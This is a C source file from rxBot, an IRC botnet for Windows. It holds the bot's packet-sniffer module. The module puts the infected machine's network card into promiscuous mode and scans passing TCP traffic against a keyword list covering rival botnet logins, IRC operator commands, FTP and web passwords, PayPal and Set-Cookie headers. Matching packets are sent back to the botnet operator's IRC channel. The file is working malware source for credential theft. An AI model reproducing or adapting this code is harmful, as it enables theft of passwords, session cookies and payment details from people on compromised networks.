/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_PSNIFF

#define SIO_RCVALL _WSAIOW(IOC_VENDOR,1)

// Scaled down distributed network raw packet sniffer (ala Carnivore)
//
// When activated, watches for botnet login strings, and 
// reports them when found.
//
// The bots NIC must be configured for promiscuous mode (recieve
// all). Chances are this already done, if not, you can enable it
// by passing the SIO_RCVALL* DWORD option with a value of 1, to
// disable promiscuous mode pass with value 0.
//
// This won't work on Win9x bots since SIO_RCVALL needs raw 
// socket support which only WinNT+ has.

char *ptype[]={
	"Unknown",
	"BOT",
	"IRC",
	"FTP",
	"PHP",
	"HTTP"
};

PSWORDS pswords[]={
	{":.login",BOTP},
	{":,login",BOTP},
	{":!login",BOTP},
	{":@login",BOTP},
	{":$login",BOTP},
	{":*login",BOTP},
	{":#login",BOTP},
	{":%login",BOTP},
	{":.asc",BOTP},
	{":!asc",BOTP},
	{":$asc",BOTP},
	{":@asc",BOTP},
	{":#asc",BOTP},
	{":.advscan",BOTP},
	{":!advscan",BOTP},
	{":$advscan",BOTP},
	{":#advscan",BOTP},
	{":@advscan",BOTP},
	{":.secure",BOTP},
	{":!secure",BOTP},
	{":@secure",BOTP},
	{":#secure",BOTP},
	{":$secure",BOTP},
	{":.scan.all",BOTP},
	{":!scan.all",BOTP},
	{":$scan.all",BOTP},
	{":#scan.all",BOTP},
	{":@scan.all",BOTP},
	{":.scan.startall",BOTP},
	{":!scan.startall",BOTP},
	{":@scan.startall",BOTP},
	{":#scan.startall",BOTP},
	{":$scan.startall",BOTP},
	{":.scan.start",BOTP},
	{":.start.scan",BOTP},
	{":!scan.start",BOTP},
	{":!start.scan",BOTP},
	{":#scan.start",BOTP},
	{":#start.scan",BOTP},
	{":$scan.start",BOTP},
	{":$start.scan",BOTP},
	{":%login",BOTP},
	{":^login",BOTP},
	{":&login",BOTP},
	{":*login",BOTP},
	{":-login",BOTP},
	{":+login",BOTP},
	{":/login",BOTP},
	{":\\login",BOTP},
	{":=login",BOTP},
	{":?login",BOTP},
	{":'login",BOTP},
	{":`login",BOTP},
	{":~login",BOTP},
	{":login",BOTP},
	{":.auth",BOTP},
	{":,auth",BOTP},
	{":!auth",BOTP},
	{":@auth",BOTP},
	{":$auth",BOTP},
	{":%auth",BOTP},
	{":^auth",BOTP},
	{":&auth",BOTP},
	{":*auth",BOTP},
	{":-auth",BOTP},
	{":+auth",BOTP},
	{":/auth",BOTP},
	{":\\auth",BOTP},
	{":=auth",BOTP},
	{":?auth",BOTP},
	{":'auth",BOTP},
	{":`auth",BOTP},
	{":~auth",BOTP},
	{": auth",BOTP},
	{":.id",BOTP},
	{":,id",BOTP},
	{":!id",BOTP},
	{":@id",BOTP},
	{":$id",BOTP},
	{":%id",BOTP},
	{":^id",BOTP},
	{":&id",BOTP},
	{":*id",BOTP},
	{":-id",BOTP},
	{":+id",BOTP},
	{":/id",BOTP},
	{":\\id",BOTP},
	{":=id",BOTP},
	{":?id",BOTP},
	{":'id",BOTP},
	{":`id",BOTP},
	{":~id",BOTP},
	{": id",BOTP},
	{":.hashin",BOTP},
	{":!hashin",BOTP},
	{":$hashin",BOTP},
	{":%hashin",BOTP},
	{":.secure",BOTP},
	{":!secure",BOTP},
	{":.l",BOTP},
	{":!l",BOTP},
	{":$l",BOTP},
	{":%l",BOTP},
	{":@l",BOTP},
	{":#l",BOTP},
	{":.x",BOTP},
	{":!x",BOTP},
	{":$x",BOTP},
	{":%x",BOTP},
	{":.syn",BOTP},
	{":!syn",BOTP},
	{":$syn",BOTP},
	{":%syn",BOTP},
	{" CDKey ",BOTP},
	{"JOIN #",IRCP},
	{"NICK ",IRCP},
	{"OPER ",IRCP},
	{"oper ",IRCP},
	{":Oper",IRCP},
	{"now an IRC Operator",IRCP},
	{"//oper",IRCP},
	{"/oper",IRCP},
	{"//Oper",IRCP},
	{"/Oper",IRCP},
	{"//OPER",IRCP},
	{"/OPER",IRCP},
	{"USER ",FTPP},
	{"PASS ",FTPP},
	{"User ",FTPP},
	{"Pass ",FTPP},
	{"user ",FTPP},
	{"pass ",FTPP},
	{"Password ",FTPP},
	{"password ",FTPP},
	{"PASSWORD ",FTPP},
	{"Admin ",PHPP},
	{"admin ",PHPP},
	{"ADMIN ",PHPP},
	{"login ",PHPP},
	{"Login ",PHPP},
	{"LOGIN ",PHPP},
	{"password ",PHPP},
	{"Password ",PHPP},
	{"PASSWORD ",PHPP},
	{"User ",PHPP},
	{"user ",PHPP},
	{"USER ",PHPP},
	{"Pass ",PHPP},
	{"pass ",PHPP},
	{"PASS ",PHPP},
	{"Admin",HTTPP},
	{"ADMIN",HTTPP},
	{"admin",HTTPP},
	{"Login",HTTPP},
	{"LOGIN",HTTPP},
	{"login",HTTPP},
	{"pass",HTTPP},
	{"Pass",HTTPP},
	{"PASS",HTTPP},
	{"PASSWORD",HTTPP},
	{"Password",HTTPP},
	{"password",HTTPP},
	{"paypal",HTTPP},
	{"PAYPAL",HTTPP},
	{"PayPal",HTTPP},
	{"Paypal",HTTPP},
	{"paypal.com",HTTPP},
	{"PAYPAL.COM",HTTPP},
	{"PayPal.Com",HTTPP},
	{"Paypal.com",HTTPP},
	{"Set-Cookie:",HTTPP},
};

DWORD WINAPI SniffThread(LPVOID param) {

	char sendbuf[IRCLINE], rawdata[65535], *Packet;
	int i;
	DWORD dwRet, dwMode = 1;

	PSNIFF sniff = *((PSNIFF *)param);
	PSNIFF *sniffs = (PSNIFF *)param;
	sniffs->gotinfo = TRUE;

	IPHEADER *ip;
	TCPHEADER *tcp;
	IN_ADDR sia, dia;

	SOCKET sniffsock;
	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons(0);
	ssin.sin_addr.s_addr = finet_addr(GetIP(sniff.sock));

	if ((sniffsock = fsocket(AF_INET, SOCK_RAW, IPPROTO_IP)) == INVALID_SOCKET) {
		sprintf(sendbuf, "[PSNIFF]: Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
		addlog(sendbuf);

		clearthread(sniff.threadnum);

		ExitThread(0);
	}
	threads[sniff.threadnum].sock = sniffsock;

	if (fbind(sniffsock, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) {
		sprintf(sendbuf, "[PSNIFF]: Error: bind() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
		addlog(sendbuf);

		fclosesocket(sniffsock);
		clearthread(sniff.threadnum);

		ExitThread(0);
	}

	if (fWSAIoctl(sniffsock, SIO_RCVALL, &dwMode, sizeof(dwMode), NULL, 0, &dwRet, NULL, NULL) == SOCKET_ERROR) {
		sprintf(sendbuf, "[PSNIFF]: Error: WSAIoctl() failed, returned: <%d>.", fWSAGetLastError());
		if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
		addlog(sendbuf);

		fclosesocket(sniffsock);
		clearthread(sniff.threadnum);

		ExitThread(0);
	}

	while(1) {
		memset(rawdata, 0, sizeof(rawdata));
		Packet = (char *)rawdata;

		if (frecv(sniffsock, Packet, sizeof(rawdata), 0) == SOCKET_ERROR) {
            _snprintf(sendbuf,sizeof(sendbuf),"[PSNIFF]: Error: recv() failed, returned: <%d>", fWSAGetLastError());
			if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice);
			addlog(sendbuf);

            break;
        }

		ip = (IPHEADER *)Packet;
		if (ip->proto == 6) {
			Packet += sizeof(*ip);
			tcp = (TCPHEADER *)Packet;

			sia.S_un.S_addr = ip->sourceIP;
			dia.S_un.S_addr = ip->destIP;

			if (tcp->flags == 24) {
				Packet += sizeof(*tcp);
				if (strstr(Packet, "[PSNIFF]") == NULL) {
					for (i=0;i < sizeof(pswords) / sizeof(PSWORDS);i++) {
						if (strstr(Packet, pswords[i].text)) {
							_snprintf(sendbuf, sizeof(sendbuf), "[PSNIFF]: Suspicious %s packet from: %s:%d to: %s:%d - %s", 
								ptype[pswords[i].type], finet_ntoa(sia), fntohs(tcp->sport), finet_ntoa(dia), fntohs(tcp->dport), Packet);
							if (!sniff.silent) irc_privmsg(sniff.sock, sniff.chan, sendbuf, sniff.notice, TRUE);
							printf("%s\n",sendbuf);
							addlog(sendbuf);

							break;
						}
					}
				}
			}
		}
	}
	fclosesocket(sniffsock);
	clearthread(sniff.threadnum);

	ExitThread(0);
}
#endif
